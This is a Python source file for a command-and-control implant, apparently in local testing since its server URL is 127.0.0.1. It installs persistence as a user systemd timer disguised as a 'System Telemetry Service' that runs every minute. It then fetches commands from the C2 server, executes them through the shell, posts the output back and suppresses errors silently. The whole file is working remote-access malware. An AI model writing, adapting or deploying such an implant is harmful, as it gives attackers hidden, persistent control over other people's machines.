import requests
import subprocess
import time
import os
from pathlib import Path

# The address of the C2 Server
# Testing locally for now
SERVER_URL = "http://127.0.0.1:5000"
AGENT_ID = "agent_001"

def install_persistence():
    # 1. Define the paths
    home = str(Path.home())
    systemd_dir = os.path.join(home, ".config/systemd/user")
    service_path = os.path.join(systemd_dir, "agent.service")
    timer_path = os.path.join(systemd_dir, "agent.timer")
    
    # Ensure the directory exists
    os.makedirs(systemd_dir, exist_ok=True)

    # 2. Define the file contents
    # script_path is the absolute path to this script
    script_path = os.path.abspath(__file__)
    
    service_content = f"""[Unit]
Description=System Telemetry Service
[Service]
ExecStart=/usr/bin/python3 {script_path}
Type=oneshot
"""

    timer_content = """[Unit]
Description=Run System Telemetry every minute
[Timer]
OnActiveSec=1min
OnUnitActiveSec=1min
RandomizedDelaySec=10
[Install]
WantedBy=timers.target
"""


    # 3. Write the files if they don't exist
    if not os.path.exists(service_path):
        with open(service_path, "w") as f:
            f.write(service_content)
            
    if not os.path.exists(timer_path):
        with open(timer_path, "w") as f:
            f.write(timer_content)

    # 4. Tell systemd to load them and start
    subprocess.run(["systemctl", "--user", "daemon-reload"], check=True)
    subprocess.run(["systemctl", "--user", "enable", "agent.timer"], check=True)
    subprocess.run(["systemctl", "--user", "start", "agent.timer"], check=True)
    
    print("[+] Persistence installed successfully.")

def check_in():
    try:
        # 1. Ask for a task
        response = requests.get(f"{SERVER_URL}/get_task/{AGENT_ID}")
        task = response.json().get("task")

        # 2. If the task is nop, do nothing
        if task == "nop":
            return

        # 3. Execute the task using the system shell
        print(f"[*] Executing task: {task}")
        process = subprocess.Popen(task, shell=True, 
                                   stdout=subprocess.PIPE, 
                                   stderr=subprocess.PIPE, 
                                   text=True)
        stdout, stderr = process.communicate()
        
        # Combine output and errors to send back
        result = stdout + stderr

        # 4. Send the result back to the server
        requests.post(f"{SERVER_URL}/post_result/{AGENT_ID}", 
                      json={"result": result})
        
    # 5. Fail silently if there's an error
    except Exception as e:
        pass

if __name__ == "__main__":
    if not os.path.exists(os.path.expanduser("~/.config/systemd/user/agent.timer")):
        install_persistence()
    check_in()